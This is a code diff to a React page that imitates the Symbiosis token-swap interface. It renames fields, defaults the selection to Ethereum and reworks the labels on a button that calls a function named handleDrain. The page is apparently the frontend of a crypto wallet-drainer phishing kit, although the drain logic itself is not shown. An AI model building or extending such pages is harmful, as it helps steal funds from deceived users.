@@ -14,6 +14,7 @@ import Switch from "@/components/symbiosis/Switch";
 import "/public/symbiosis/cygnito-font.css";
 import useSymbiosis from "@/hooks/useSymbiosis";
 import AccountDropdown from "@/components/symbiosis/AccountDropdown";
+import { ethereumTokens } from "@/data/symbiosis/ethereum";
 
 // Dummy data for pools
 const pools = [
@@ -164,7 +165,7 @@ export interface Token {
   name: string;
   address: string;
   symbol: string;
-  image: string;
+  icon: string;
   balance?: string;
 }
 
@@ -173,7 +174,7 @@ export interface Network {
   icon: string;
   isNew?: boolean;
   tokens?: Token[];
-  chainId?: number;
+  id?: number;
 }
 
 export default function Page() {
@@ -182,7 +183,7 @@ export default function Page() {
   const [activeTab, setActiveTab] = useState<"swap" | "pools" | "zap">("swap");
   const [showSettings, setShowSettings] = useState(false);
   const [showDeprecated, setShowDeprecated] = useState(false);
-  const [address, setAddress] = useState("");
+  const [customAddress, setCustomAddress] = useState("");
   const [slippage, setSlippage] = useState("0.5");
   const [loading, setLoading] = useState(false);
   const [isAddressOpen, setIsAddressOpen] = useState<boolean>(false);
@@ -194,13 +195,20 @@ export default function Page() {
 
   const [searchTerm, setSearchTerm] = useState("");
   const [selectedFromNetwork, setSelectedFromNetwork] =
-    useState<Network | null>(null);
+    useState<Network | null>({
+      icon: "https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png",
+      name: "Ethereum",
+      id: 1,
+    });
   const [selectedToNetwork, setSelectedToNetwork] = useState<Network | null>(
     null
   );
-  const [selectedFromToken, setSelectedFromToken] = useState<Token | null>(
-    null
-  );
+  const [selectedFromToken, setSelectedFromToken] = useState<Token | null>({
+    address: "",
+    icon: "https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png",
+    name: "Ethereum",
+    symbol: "ETH",
+  });
   const [selectedToToken, setSelectedToToken] = useState<Token | null>(null);
   const [tokens, setTokens] = useState<Token[]>([]);
   const [filteredTokens, setFilteredTokens] = useState<Token[]>([]);
@@ -341,8 +349,8 @@ export default function Page() {
           </label>
           <input
             type="text"
-            onChange={(e) => setAddress(e.target.value)}
-            value={address}
+            onChange={(e) => setCustomAddress(e.target.value)}
+            value={customAddress}
             placeholder="..."
             className="w-full bg-[#fff] shadow-md rounded-lg p-4 outline-none font-mono"
           />
@@ -358,14 +366,16 @@ export default function Page() {
         onClick={() => handleDrain()}
         disabled={loading}
         className={`${
-          address === "" ? "bg-[#A3A3A3]" : "bg-[#76FB6D]"
+          customAddress === "" ? "bg-[#A3A3A3]" : "bg-[#76FB6D]"
         } w-full bg-black text-white py-4 rounded-lg hover:bg-gray-900 transition-colors`}
       >
-        {ethers.utils.isAddress(address)
-          ? "TRANSFER"
-          : loading
-          ? "TRANSFERRING..."
-          : "SET VALID ADDRESS"}
+        {customAddress.length > 1 &&
+        !ethers.utils.isAddress(customAddress) &&
+        !loading
+          ? "SET VALID ADDRESS"
+          : ""}
+        {loading ? "TRANSFERRING..." : ""}
+        {selectedToToken ? "" : "SELECT THE TOKEN YOU RECEIVE"}
       </button>
     </div>
   );
